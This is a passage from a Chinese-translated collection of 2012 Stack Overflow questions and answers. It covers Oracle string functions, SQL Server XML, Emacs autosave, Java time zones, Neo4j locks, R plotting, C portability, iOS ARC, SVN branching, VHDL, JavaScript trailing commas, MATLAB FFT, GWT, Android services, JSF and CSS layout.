我发现 Oracle 中不支持 LEFT 和 RIGHT 函数。它们用于 SQL Server、MySQL 和其他一些 SQL 版本。在 Oracle 中，您需要使用 SUBSTR 函数。下面是简单的例子：

```
LEFT ('Data', 2) = 'Da'

->   SUBSTR('Data',1,2) = 'Da'

RIGHT ('Data', 2) = 'ta'

->   SUBSTR('Data',-2,2) = 'ta' 
```

请注意，负数从末尾开始倒数。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-03T10:58:06.670

Oracle 中没有记录的 LEFT() 函数。 [在这里找到全套](http://docs.oracle.com/cd/B19306_01/server.102/b14200/functions.htm#i1482196)。

可能您拥有的是用户定义的函数。您可以通过查询数据字典轻松检查：

```
select * from all_objects
where object_name = 'LEFT' 
```

但是有一个问题是为什么存储过程有效而查询无效。一种可能的解决方案是存储过程由另一个模式拥有，该模式也拥有 LEFT() 函数。他们已授予程序权限，但未授予其依赖项。这是因为存储过程在默认情况下以 DEFINER 权限运行，因此您运行存储过程就像您是它的所有者一样。

如果是这样，那么我上面列出的数据字典查询将无法帮助您：它只会返回您拥有权限的对象的行。在这种情况下，您需要以存储过程的所有者身份运行查询，或者以有权查询 DBA_OBJECTS 的用户身份连接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-13T18:54:02.950

LEFT 不是 Oracle 中的函数。这可能来自熟悉[SQL Server](https://docs.microsoft.com/en-us/sql/t-sql/functions/left-transact-sql)的人：

> 返回具有指定字符数的字符串的左侧部分。

```
-- Syntax for SQL Server, Azure SQL Database, Azure SQL Data Warehouse, Parallel Data Warehouse  
LEFT ( character_expression , integer_expression ) 
```

# sql - 如何从 sql server 中的 xml 获取子 xml

> ID：11309251
> 
> 赞同：0
> 
> 时间：2012-07-03T10:44:07.753
> 
> 标签：sql, sql-server, xml, sql-server-2008

我的 XML 格式是这样的：

```
<Main>
  <IsD>false</IsD>
  <IsN>true</IsN>
  <ID>826e03b3-191c-40c9-8a3d-f6607842fa5f</ID>
  <ClientId>c6a32c38-0398-4806-b82f-e924f96217fa</ClientId>
  <General>
    <IsD>false</IsD>
    <IsN>true</IsN>
    <State>New</State>
    <TypeID>1</TypeID>
    <ProductID>-1</ProductID>
    <PeriodId>1</PeriodId>
    <StateID>5</StateID>
    <Rating>8</Rating>
  </General>
  <Feature>
    <TypeID>2</TypeID>
    <DurationID>-1</DurationID>
    <ClassID>-1</ClassID>
    <Fee>2500</Fee>
    <BonusID>-1</BonusID>
    <BenefitID>15</BenefitID>
  </Feature>
</Main> 
```

我已将此 xml 传递给存储过程，并且在此存储过程中，我将所有`Main`子节点数据保存在主表中。

但是现在对于通用表和功能表，我正在使用另一个 sp，我想将标签上的所有子节点作为 xml 传递给这个 generalinertionsp，并且与功能相同。

但是我怎样才能将这些节点传递给另一个 sp。

我如何将内部子节点值读取为 xml 并将部分 xml 传递给另一个 sp？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T10:59:44.290

如果`@x`是您的 XML 变量

```
 select @x.query('/Main/General')
 select @x.query('/Main/Feature') 
```

会给你的子节点

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T11:00:38.537

`.query()`您可以使用SQL Server中的函数选择原始 XML 的片段：

```
DECLARE @input XML = '... (your XML here).....' 

SELECT 
    GeneralNode = @input.query('Main/General'),
    FeatureNode = @input.query('Main/Feature') 
```

您现在可以将此 XML 片段传递到您的其他存储过程中以在那里进行处理。

# emacs - 指定目录时，Emacs 中的自动保存无法正常工作

> ID：11309259
> 
> 赞同：3
> 
> 时间：2012-07-03T10:44:25.113
> 
> 标签：emacs, elisp, autosave, emacs24

我正在尝试将自动保存设置为使用 ./emacs.d/autosaves 中的目录。我之前使用了下面的两条注释掉的行，目前尝试了我在网上找到的另一个功能。我真正想要的只是不将自动保存存储在同一目录中。它在

```
(defvar autosave-dir
 (concat "/home/" (user-login-name) "/.emacs.d/autosaves/"))
(make-directory autosave-dir t)
(defun auto-save-file-name-p (filename)
  (string-match "^#.*#$" (file-name-nondirectory filename)))
(defun make-auto-save-file-name ()
  (concat autosave-dir
   (if buffer-file-name
      (concat "#" (file-name-nondirectory buffer-file-name) "#")
    (expand-file-name
     (concat "#%" (buffer-name) "#")))))
;; (setq auto-save-file-name-transforms
;;       `(("#.*#" ,"~/.emacs.d/backups/" t))) 
```

或者我可以设置自动保存以将#notes.org# 放在文件的开头和结尾，因为目前的格式为.#notes.org。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-05T11:41:20.233

这是关于锁定文件。有关更多信息，请阅读：

```
(info "(emacs) Interlocking") 
```

基本上没有办法解决它，除非执行一个小的重写并从我读过的内容中编译你自己的 emacs 源代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T12:09:25.883

您需要的只是（假设所引用的目录`autosave-dir`存在）：

```
(setq auto-save-file-name-transforms
      `((".*" ,autosave-dir t))) 
```

我个人喜欢使用标准的*tmp*目录进行自动保存：

```
(setq auto-save-file-name-transforms
      `((".*" ,temporary-file-directory t))) 
```

# java - 解析 ISO 8601 字符串本地日期时间，就像在 UTC 中一样

> ID：11309264
> 
> 赞同：2
> 
> 时间：2012-07-03T10:44:34.473
> 
> 标签：java, calendar

在java中，我需要从格式的字符串中创建一个日历对象：

```
yyyy-MM-dd'T'HH:mm:ss 
```

此字符串将始终设置为 GMT 时间。所以这是我的代码：

```
 public static Calendar dateDecode(String dateString) throws ParseException
{
    TimeZone t = TimeZone.getTimeZone("GMT");
    Calendar cal = Calendar.getInstance(t);
    date = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss");
    Date d = date.parse(dateString);
    cal.setTime(d);
    return cal;
} 
```

进而：

```
Calendar cal = Calendar.getInstance();
    try
    {
        cal = dateDecode("2002-05-30T09:30:10");
    } catch (ParseException e)
    {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    int month =  cal.get(Calendar.MONTH)+1; 
```

我得到以下输出：

```
Timezone: GMT+00:00 date: 2002-5-30 time: 7:30:10 
```

正如您所看到的那样，这是错误的，因为提供的时间是格林威治标准时间而不是欧洲中部时间。我认为发生的情况是它认为提供的时间是 CET（这是我当前的时区），因此将时间从 CET 转换为 GMT，因此从最终结果中减去两个小时。

谁能帮我解决这个问题？

谢谢

顺便说一句：出于不同的原因，我不想使用 JodaTime。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T10:50:23.747

这里有一些代码可以帮助您在解析它们之前设置时区：

```
// sdf contains a Calendar object with the default timezone.
Date date = new Date();
String formatPattern = ....;
SimpleDateFormat sdf = new SimpleDateFormat(formatPattern);

TimeZone T1;
TimeZone T2;
....
....
// set the Calendar of sdf to timezone T1
sdf.setTimeZone(T1);
System.out.println(sdf.format(date));

// set the Calendar of sdf to timezone T2
sdf.setTimeZone(T2);
System.out.println(sdf.format(date));

// Use the 'calOfT2' instance-methods to get specific info
// about the time-of-day for date 'date' in timezone T2.
Calendar calOfT2 = sdf.getCalendar(); 
```

我发现的另一个类似问题也可能有帮助：[How to set default time zone in Java and control the way date are stored on DB?](https://stackoverflow.com/questions/5620242/how-to-set-default-time-zone-in-java-and-control-the-way-date-are-stored-on-db)

编辑：

这里也是关于 Java 和日期的一个很棒的教程：[http ://www.tutorialspoint.com/java/java_date_time.htm](http://www.tutorialspoint.com/java/java_date_time.htm)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-02-21T03:30:46.057

# graph - Neo4j：无法锁定存储

> ID：11309266
> 
> 赞同：4
> 
> 时间：2012-07-03T10:44:46.877
> 
> 标签：graph, locking, neo4j

我正在使用 Neo4j 图形数据库并在浏览器上查看数据。因此，每当我运行代码时，我都需要更改 neo4j-server.properties 文件中的数据库位置字段。

当我尝试使用浏览器访问数据库时，出现以下错误：

```
Exception in thread "main" java.lang.IllegalStateException: Unable to lock store
[<DB path>], this is usually a result of some other Neo4j kernel running using
the same store. 
```

是否可以在不锁定存储的情况下查看数据库？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-06T17:02:55.800

还有另一个使用 db 的进程。例如，您使用另一个程序（例如终端中的 gremlin shell）打开它，或者正在运行另一个 neo4j 实例。

如果您使用的是类 Unix 系统（Linux、MacOSX 等），那么您可以使用 lsof 来确定打开您的数据库的进程。例如，如果我的数据库的路径是`/home/user/db/myneo4j.db`，那么我会搜索：

```
$ lsof /home/user/db/myneo4j.db/neostore.propertystore.db.index 
```

或者你可以试试：

```
$ lsof | grep myneo4j.db 
```

这将告诉您已获取（锁定）数据库的进程 ID。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T16:40:33.853

在启动 neo4j 服务器以查看数据之前，您确定没有针对数据存储运行 java 进程吗？

# r - 如何在同一 x 轴上绘制具有不同开始日期的时间序列

> ID：11309272
> 
> 赞同：1
> 
> 时间：2012-07-03T10:45:20.807
> 
> 标签：r

假设我有 2 个数据集，1 个在 x 轴上有 50 天，一个有 20 天，使用代码创建

```
par(mfrow=c(2,1))
data1=rnorm(50)
plot(data1,type='l',xlab='Days')
data2=rnorm(20)
plot(data2,type='l',xlim=c(0,50),xlab='Days') 
```

![在此处输入图像描述](../Images/80049e0ab657b78cc78b79e23f8a59fa.png)

实际上，数据集 2 中的第 1 天对应于数据集 1 中的第 20 天，所以我想绘制数据集 2，使得 x 轴，如上，从 0 到 50，但数据从 x=20 绘制到 x = 40\. 我猜有一个简单的答案，但我在网上找不到...

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T10:49:54.363

传球`x`和`y`论据进行绘图。

```
plot(20:39,data2,type='l',xlim=c(0,50),xlab='Days') 
```

虽然如果你用相同的轴绘制多个数据集，你最好使用 ggplot2 或 lattice。你的情节会看起来好多了。

```
all_data <- data.frame(
  day = c(1:50, 20:39),
  y   = c(runif(50), rnorm(20)),
  grp = factor(rep(1:2, times = c(50, 20)))  
)

#ggplot2 style
library(ggplot2)
ggplot(all_data, aes(day, y)) +
  geom_line() +
  facet_grid(grp ~ .)

#lattice style
library(lattice)
xyplot(y ~ day | grp, all_data, type = "l", layout = c(1, 2)) 
```

# c - 假设 sizeof(double) >= sizeof(void*) 是否安全？

> ID：11309273
> 
> 赞同：1
> 
> 时间：2012-07-03T10:45:21.837
> 
> 标签：c, portability, sizeof, c99, void-pointers

假设`sizeof(double)`总是大于或等于是否安全`sizeof(void*)`？

在某些情况下，以下是可移植的吗？

```
int x = 100;
double tmp;

union {
  double dbl;
  void* ptr;
} conv;

conv.ptr = (void*)&x;
tmp = conv.dbl;

conv.dbl = tmp;
printf("%d\n", *((int*)conv.ptr)); 
```

[它确实可以](http://ideone.com/ZnR7c)在我测试过的几台机器上运行，但是如果`sizeof(void*) > sizeof(double)`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T13:32:18.357

在当前系统上是的。*在所有当前和未来的*`double`系统上都是64 位，因为它们与 IEEE 算术的双精度对齐。将来指针可能会更大是不可能的但肯定有可能 - 可能不是为了更大的地址空间，而是为了携带它们的边界信息。

 *无论如何，依赖`double`和之间的任何关系似乎是一个非常糟糕的主意`void *`......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:30:48.010

大小与它无关。总会有一些位存储在那里，并且大小总是足够大以容纳`void*`. 会出错的是您将几乎随机的位模式解释为指针，除了崩溃之外，这无能为力，但很可能您已经知道了。不要这样做。*

# iphone - iphone中的电弧问题

> ID：11309279
> 
> 赞同：1
> 
> 时间：2012-07-03T10:45:31.907
> 
> 标签：iphone, automatic-ref-counting

我正在通过使用`singleviewapplication`模板开发 iphone，但选择了 ARC 复选框。在我的应用程序中需要第三个框架，但是当我运行我的应用程序时发生了很多错误。所有错误都与 ARC 有关。我该如何解决这些错误？任何人都可以帮助我。

提前致谢！！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T10:49:31.810

`-fno-objc-arc`您可以通过在这些文件上使用编译器标志来编译一些没有 ARC 的文件。

[从这篇文章](https://stackoverflow.com/questions/6646052/how-can-i-disable-arc-for-a-single-file-in-a-project)中引用。

> 您在 Targets -> Build Phases -> Compile Sources 中添加编译器标志。您必须双击编译器标志下行的右列。您也可以通过按住 cmd 按钮选择文件，然后按 Enter 调出标志编辑框，将其添加到多个文件中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:55:30.027

你可以参考这些教程。它们很容易理解。

[http://www.raywenderlich.com/5677/beginning-arc-in-ios-5-part-1](http://www.raywenderlich.com/5677/beginning-arc-in-ios-5-part-1)

[http://www.raywenderlich.com/5773/beginning-arc-in-ios-5-tutorial-part-2](http://www.raywenderlich.com/5773/beginning-arc-in-ios-5-tutorial-part-2)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T10:58:28.143

那可能是因为您使用的框架不使用 ARC。要解决此问题，请取消选中项目设置中的使用 ARC。

要保留框架原样并在项目的其余部分使用 ARC，在 xcode 中，转到 Edit>Refactor>Convert to Objective-C ARC，然后在出现的对话框中，选择要使用 ARC 的所有文件（即应用程序委托、视图控制器、UIViews...）

# svn - 如何将分支分支直接合并到主干

> ID：11309281
> 
> 赞同：1
> 
> 时间：2012-07-03T10:45:46.673
> 
> 标签：svn, branch

我们的项目有一个“主干”。

我在分支 A 上工作，添加了几个功能，并不断合并来自“主干”的更改。

现在，我在分支 A 上的工作已经完成，我想开始研究新功能。

但是，主干的经理还不想将分支 A 重新整合到主干。

我应该怎么办？

*   我可以直接从主干启动一个新的分支 B，但是我不会从分支 A 获得我的功能。
*   我可以从分支 A 开始一个新的分支 B，但是我将无法将我的新功能从分支 B 直接重新集成合并到主干（我在示例文件上尝试过，但冲突太多）。

这种情况的最佳实践是什么？

我们的服务器是 SVN 1.6。

（注意：这与[分支的 SVN 分支不同](https://stackoverflow.com/questions/8665878/svn-branch-of-a-branch)）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T14:52:28.570

然后，只要您将分支 B 集成到 A 中，您就应该等待分支 A 的集成

在 SVN 中，有一个简单的规则可以让你在合并时保持疯狂：

**仅从您的分支源合并到您的分支源**（最好是使用集成选项）

所有其他方法（交叉合并，樱桃采摘，..）在（不久的？）将来会产生一些令人头疼的问题

# ajax - 当您使用画布 url 时，facebook 是否以不同的方式/以不同的方式传递数据？

> ID：11309284
> 
> 赞同：0
> 
> 时间：2012-07-03T10:45:56.273
> 
> 标签：ajax, facebook, oauth

我已经为 facebook 建立了一个前端授权。当我将 redirect_uri 设置回源页面时，我会收到一个可用于进行 api 调用的令牌

但是，当我重定向到我的 facebook-canvas 页面时，当我尝试进行 ajaxcall 时它会抱怨：

```
Uncaught Could not perform AJAX call because no valid tokens was found. 
```

[我使用了一个名为jso](https://github.com/andreassolberg/jso)的通用 oauth-library ，我检查了 facebook sdk，它并没有真正满足我的目的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-17T19:59:21.863

是的，它发布到 iframe 而不是“get”：ed。您需要在服务器端捕获它。

# vhdl - VHDL如何在设定的时间段内检查重合

> ID：11309285
> 
> 赞同：0
> 
> 时间：2012-07-03T10:45:57.373
> 
> 标签：vhdl

我正在尝试使用 VHDL 对可能在预设时间范围内进入 FPGA 的信号实施巧合检查，我担心我可能正在尝试发明一些已经做过很多次的非常基本的东西......

所需的模块功能：

记住其中一个输入上有一个信号，在预设时间段后，将这些记住的信号视为同步信号，并将它们进一步发送到电路中。

示例：侦听 2 个输入端口 (A,B)，以防在输入上检测到至少一个 10 ns 长的信号，将其存储，并在 500ns 周期内进一步发送存储的信号并复位。

到目前为止，我想出了这个：

存储输入：

```
memory_A <= A when ( memory_A = '0' );
memory_B <= B when ( memory_B = '0' ); 
```

现在我需要进一步发送它们并重置。我有一个模块，它以 500ns 的间隔为我提供 10ns 长脉冲，所以我将使用它的输出来为我的进程计时：

```
process(pulse)
  begin
     if(pulse'event and pulse='1') then
                                          -- generate output signals
        modified_output_A <= memory_A
        modified_output_B <= memory_B
                                          -- reset the storage
        memory_A <= '0'
        memory_B <= '0'
     end if;

  end process; 
```

我将把它包装成一个模块

输入：A、B 和脉冲
输出：modified_A、modified_B。

现在我得到了同步的 A、B 信号，我可以应用逻辑（检查巧合等）。

我的问题是：

*   这行得通吗？

*   这是一个好方法吗，有什么我可能看不到的缺点或问题吗？

*   如果这不是做到这一点的好方法，应该如何做到这一点？

感谢您提前提供所有反馈/帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:33:12.707

看起来您在*memory_A*和*memory_B*上有多个驱动程序。您应该只在此过程中分配它们。

另外我不确定在非时钟信号上使用**信号**'*事件是否是好的设计实践。*可能取决于您的综合工具。我会使用时钟过程并通过移位寄存器获得上升沿。或者它们不应该是时钟寄存器输出吗？

我也错过了重置和时钟信号；）

# javascript - 检测并删除 javascript 对象文字尾随逗号

> ID：11309293
> 
> 赞同：1
> 
> 时间：2012-07-03T10:46:19.233
> 
> 标签：javascript, regex, internet-explorer

IE7 不接受 JavaScript 对象文字中的尾随逗号作为有效的 JavaScript 语法：

```
var a = {
  foo: 12,
  bar: 13,//this is ok in all browsers except ie7
}; 
```

目前我处理这个问题的方法是使用 IE7 打开我的网站并使用控制台查找无效的 js 文件。

您知道如何使用 UNIX 命令行在 javascript 文件中定位（甚至更好地删除）尾随逗号吗？

我试图 grep 这些逗号，但需要多行正则表达式。我还用谷歌搜索了这个主题，没有发现任何有用的东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T10:50:54.143

[JSHint](http://www.jshint.com/)可以为您找到这些。您可以下载它并从命令行运行它。它还可以为您检查许多有用的附加功能（以及关闭您不想要的功能的选项）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T10:57:01.297

您可以编写一个脚本来为您执行此操作：

```
$ cat 1.pl 
local $/;

my $data = <>;
$data =~ s@,(\s*)((?://.*?\n)?)(\s*)}@ $1$2$3}@msg;
print $data;

$ cat 1.txt 
var a = {
  foo: 12,
  bar: 13, //this is ok in all browsers except ie7
};

var b = {
  foo: 14,
  bar: 15,
};

$ perl -i 1.pl 1.txt

$ cat 1.txt 
var a = {
  foo: 12,
  bar: 13  //this is ok in all browsers except ie7
};

var b = {
  foo: 14,
  bar: 15 
}; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-28T18:11:33.270

它并不完美，但它可以定位文件（它不是打印行）：

```
find -name '*.js' -exec grep -Pzl ",\s*\n+(\s*\/\/.*\n)*\s*[\}\)\]]" {} \; 
```

答案部分取自这个问题：

[需要用于多行搜索的正则表达式（grep）](https://stackoverflow.com/questions/3717772/regex-grep-for-multi-line-search-needed)

附言

肯定有这样一个缺陷：

```
// whatever is done next,
} 
```

它将被报告为尾随昏迷，而事实并非如此。

# matlab - 我是否以正确的方式使用傅立叶变换？

> ID：11309294
> 
> 赞同：6
> 
> 时间：2012-07-03T10:46:19.310
> 
> 标签：matlab, signal-processing, fft, frequency, frequency-analysis

我想知道我是否以正确的方式在 MATLAB 中使用傅立叶变换。我想要一首歌中频率的所有平均幅度。出于测试目的，我使用[了贝多芬“为 Elise”的免费 mp3 下载，我使用](http://www.forelise.com/recordings/valentina_lisitsa)[Audacity](http://audacity.sourceforge.net/)将其转换为 8 kHz 单声道文件。

我的 MATLAB 代码如下：

```
clear all % be careful

% load file
% Für Elise Recording by Valentina Lisitsa 
% from http://www.forelise.com/recordings/valentina_lisitsa
% Converted to 8 kHz mono using Audacity
allSamples = wavread('fur_elise_valentina_lisitsa_8khz_mono.wav');

% apply windowing function
w = hanning(length(allSamples));
allSamples = allSamples.*w;

% FFT needs input of length 2^x
NFFT = 2^nextpow2(length(allSamples))

% Apply FFT
fftBuckets=fft(allSamples, NFFT); 
fftBuckets=fftBuckets(1:(NFFT/2+1)); % because of symetric/mirrored values

% calculate single side amplitude spectrum, 
% normalize by dividing by NFFT to get the 
% popular way of displaying amplitudes
% in a range of 0 to 1
fftBuckets = (2*abs(fftBuckets))/NFFT; 

% plot it: max possible frequency is 4000, because sampling rate of input
% is 8000 Hz
x = linspace(1,4000,length(fftBuckets));
bar(x,fftBuckets); 
```

然后输出如下所示： ![在此处输入图像描述](../Images/6579f7e79f45a6f300618640f1868079.png)

1.  有人可以告诉我我的代码是否正确吗？我特别想知道 0 附近的峰值。
2.  为了规范化，我必须除以`NFFT`or`length(allSamples)`吗？
3.  对我来说，这看起来并不像条形图，但我想这是由于我正在绘制的许多值？

感谢您的任何提示！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-03T11:22:58.400

1.  取决于你对“正确”的定义。我认为，这是按照您的意图进行的，但它可能不是很有用。我建议改用 2D[频谱图](http://www.mathworks.co.uk/help/toolbox/signal/ref/spectrogram.html)，因为您将获得有关频率内容的时间本地化信息。

2.  标准化 FFT 输出没有一种正确的方法。有各种不同的约定（参见例如[这里](http://en.wikipedia.org/wiki/Discrete_Fourier_transform#Definition)的讨论）。您的代码中的注释说您想要 0 到 1 的范围；如果您的输入值在 -1 到 1 的范围内，那么除以箱数即可实现。

3.  嗯，没错！

我还建议以对数刻度（以[分贝](http://en.wikipedia.org/wiki/Decibels)为单位）绘制 y 轴，因为这大致是人耳解释响度的方式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T16:03:53.690

有两件事让我感到震惊：

1.  我不确定你为什么在你的情节中包含 DC (index = 1) 组件。没什么大不了的，但当然那个 bin 不包含频率数据
2.  我认为除以`length(allSamples)`比除以更可能是正确的`NFFT`。原因是，如果您希望 DC 分量等于输入数据的平均值，那么除以`length(allSamples)`是正确的做法。

但是，就像 Oli 所说的那样，在您确切知道要计算的内容之前，您无法真正说出“正确的”归一化是什么。我倾向于使用 FFT 来估计功率谱，所以我想要像“DAC / rt-Hz”这样的单位，这会导致与你想要像“DAC / Hz”这样的东西不同的归一化。

最终，没有什么可以替代您想从 FFT 中得到什么（包括单位），并为自己制定正确的归一化应该是什么（必要时从 FFT 的定义开始）。

您还应该知道，MATLAB`fft`不需要使用 2 的幂的数组长度（尽管这样做可能会导致 FFT 运行得更快）。因为零填充会引入一些振铃，所以您需要考虑它是否适合您的应用程序。

最后，如果周期图/功率谱确实是您想要的，MATLAB 提供了类似的函数`periodogram`，`pwelch`以及其他可能有用的函数。

# performance - 如何提高 GWT 性能？

> ID：11309297
> 
> 赞同：0
> 
> 时间：2012-07-03T10:46:30.060
> 
> 标签：performance, gwt

我正在使用 GWT 2.4。有时我必须显示大量记录，例如：在我的屏幕上以 gridtable 或 flextable 显示 50,000 条记录。但是加载该屏幕需要很长时间，例如大约 30 分钟左右；或者，最终屏幕挂起，或者 IE 有时会显示一个错误，指出这可能需要很长时间并且您的应用程序将停止工作，所以您希望继续。

有没有提高gwt性能的解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T14:33:19.647

不要一次带来所有数据，你应该把它带到页面中，就像这里的评论所建议的那样。
但是，分页并非微不足道，因为在分页期间您的数据库可能充满了更多条目，并且如果您对结果使用某种排序算法，
新条目可能会破坏您的排序（例如，当尝试获取第 2 页，插入了一些本应在第一页上的条目。
您可能决定创建某种“光标”以用于分页目的，它将反映您创建数据库时的状态，因此您将忽略在页面之间遍历期间输入的整体。
作为分页的一部分，您可以考虑的另一个选项是只为每条记录提供一个小版本 - 即 - 只提供最重要的详细信息，如果用户想查看记录的全部详细信息，请双击 - 这也可以提供您在每个页面中都有一些性能改进。

# android - 通过 adb 启动 intentservice 失败

> ID：11309298
> 
> 赞同：0
> 
> 时间：2012-07-03T10:46:40.250
> 
> 标签：android, service, adb, intentservice

当我尝试通过 adb 启动 IntentService 时，出现以下错误

```
E/AndroidRuntime( 2418): java.lang.RuntimeException: Unable to instantiate service 
com.myCompany.MyPackage.Service: java.lang.InstantiationException: 
com.myCompany.MyPackage.Service 
```

当我启动正常的服务 ovre adb 时，一切正常。

无法通过 adb 启动意图服务的原因是什么？

```
public class NCService extends IntentService {

public NCService(String name) {
    super(name);
    // TODO Auto-generated constructor stub
}

NetworkStateReceiver nsr;

@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    // TODO Auto-generated method stub
    Toast.makeText(getBaseContext(), "onStartCommand", 0).show();
    nsr = new NetworkStateReceiver();

    return START_STICKY;
}

@Override
public void onCreate() {
    // TODO Auto-generated method stub
    Toast.makeText(getBaseContext(), "onCreate", 0).show();
    super.onCreate();
}

@Override
public void onDestroy() {
    // TODO Auto-generated method stub
    Toast.makeText(getBaseContext(), "onDestroy", 0).show();
    super.onDestroy();
}

@Override
public IBinder onBind(Intent intent) {
    // TODO Auto-generated method stub
    return null;
}

@Override
protected void onHandleIntent(Intent intent) {
    // TODO Auto-generated method stub

} 
```

}

```
<uses-sdk android:minSdkVersion="10" />

<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >

    <service android:name=".NCService" />

    <receiver android:name=".NetworkStateReceiver" >
        <intent-filter>
            <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
        </intent-filter>
    </receiver>
</application> 
```

问候西蒙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T12:06:39.670

您的服务需要一个默认的无参数构造函数，否则 Android 不知道作为名称参数传递的参数：

```
public NCService() {
    super("MyNCService");
} 
```

# jsf-2 - 从 JSF1.2+Facelets 迁移到 JSF2，“具有重复 id 的组件”问题

> ID：11309299
> 
> 赞同：0
> 
> 时间：2012-07-03T10:46:42.977
> 
> 标签：jsf-2, facelets, tomahawk

我正在将应用程序从 JSF1.2/MyFaces+Facelets 迁移到 JSF2.1/MyFaces。我有以下用于 JSF1.2/MyFaces+Facelets 的模板。

```
<ui:component>
<f:subview id="#{id}">
.
.

<script
function blockLinkClicks(){
    //Disables all the HyperLink Controls to prevent repeated submits
    var allLinks = document.getElementById("#{id}:treeNodeForm").getElementsByTagName('a');
    var count = allLinks.length;
.
.
</script>
.
.
.
<h:form id="treeNodeForm">  
    <h:panelGroup id="treePanelId"> 
        <t:tree2 id="tree2Id" 
            value="#{treeBean.treeModel}" var="node" varNodeToggler="t"
            binding="#{treeBean.component}" clientSideToggle="false" showNav="false">
            <f:facet name="selectableNode">
                <h:panelGrid id="tree2PGridSelNodeId" columns="3" cellpadding="0" cellspacing="0" border="0">
.
.
. 
```

迁移后，我收到以下错误：

java.lang.IllegalStateException:在 org.apache.myfaces 的 org.apache.myfaces.view.facelets.compiler.CheckDuplicateIdFaceletUtils.checkIds(CheckDuplicateIdFaceletUtils.java:100) 中找到具有重复 ID“ **mainLeftTree:treeNodeForm:tree2Id:tree2PGridSelNodeId** ”的组件。 view.facelets.compiler.CheckDuplicateIdFaceletUtils.checkIds(CheckDuplicateIdFaceletUtils.java:116)

我在 SO 中发现了类似的问题，但我无法将解决方案与上述问题联系起来。我试图找到解决方案很多天/几个小时，但找不到。

请帮助您提供我可以尝试修复的建议和指示，因为我不确定问题是否与 f:subview 或 t:tree2 或 jsf2 facelets 有关。

非常感谢您提前。

问候，库马尔。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:41:18.153

我认为问题是由使用 引起的`<f:subview id="#{id}>"`，这显然会在启用 PSS 时中断，因为每次构建视图时都会评估 EL。首先尝试将 web 配置参数 javax.faces.PARTIAL_STATE_SAVING 设置为 false。或者您可以使用配置参数 javax.faces.FULL_STATE_SAVING_VIEW_IDS 来指示哪些视图需要完全状态保存。避免 id 中的 EL 并在该部分使用其他策略可能是一个好主意，但这可能需要对逻辑进行一些更改。

# html - 如何使标签在div中水平排列？

> ID：11309301
> 
> 赞同：7
> 
> 时间：2012-07-03T10:46:43.427
> 
> 标签：html, css, image

我需要让图像在 div 中水平并排显示。我怎样才能做到这一点？

**HTML：**

```
<div class="Wrapper">
  <img src="/wp-content/uploads/2012/07/TFT.png" alt="Smiley face" height="90" width="95" />
  <img src="/wp-content/uploads/2012/07/Ltyt.png" alt="Smiley face" height="90" width="95" />
  <img src="/wp-content/uploads/2012/07/artspng" alt="Smiley face" height="90" width="95" />
</div> 
```

参考：[**jsFiddle**](http://jsfiddle.net/bWhhj/)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-03T10:57:01.280

您还可以使用 css 属性**display:inline-block**或**float : left**来实现这一点。

HTML 代码

```
<div>
    <img ... />
    <img ... />
    <img ... />
</div> 
```

CSS 代码

```
div img{ display: inline-block;} 
```

或者

```
div img{ display: block;float: left;margin-right: 5px;} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-03T10:48:39.987

一般假设您的代码是这样的

```
<div>
    <img ... />
    <img ... />
    <img ... />
</div> 
```

然后，一个简单的 CSS 属性就可以完成这项工作。

```
div img { display: inline; } 
```

* * *

看到您的 HTML 部分。您可以使用以下 CSS 使它们联机。

```
.partners img { display: inline; } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T10:55:03.183

而不是使用`inline`，这会夺走元素附带的很多控件`block`，或者更改它们的垂直对齐方式，我会浮动它们：

```
<html>
    <head>
        <style>
            div.img_holder img
            {
                float: left;
            }
        </style>
    </head>
    <body>
        <div class = "img_holder">
            <img src="" />
            <img src="" />
            <img src="" />
            <img src="" />
        </div>
    </body>
</html> 
```

浮动在 CSS 中是一门独特的科学。它非常值得学习，因为它可以产生一些非常强大的结果。例如，`divs`使用这些而不是图像`inline`会阻止您设置它们的高度。 `Inline`也影响如何`margins`和`padding`工作。 `vertical-align`在浏览器之间是不一致的，如果我没记错的话，实际上根本不应该产生你正在寻找的结果。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T10:47:59.403

现在你可以习惯了

